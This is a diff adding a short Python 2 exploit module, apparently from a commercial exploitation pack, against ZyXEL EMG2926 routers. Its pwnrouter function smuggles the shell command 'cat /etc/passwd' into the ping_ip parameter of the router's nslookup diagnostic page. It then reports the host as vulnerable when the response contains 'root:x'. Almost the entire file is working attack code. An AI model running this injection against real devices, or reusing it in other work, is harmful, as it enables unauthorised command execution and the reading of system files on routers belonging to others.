@@ -1,0 +1,38 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys
+import requests
+
+_name_   = 'd2sec_zyxel_3'
+_vendor_ = 'zyxel'
+_model_  = ['EMG2926 < V1.00(AAQT.4)b8']
+_vuln_   = 'Remote Code Execution Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    response = requests.get("http://%s/cgi-bin/luci/;stok=<Clipped>/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=d2sec.com; cat /etc/passwd&server_ip="%host, timeout=5)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if 'root:x' in response.text:
+    print '[+] %s vulnerable' % host
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
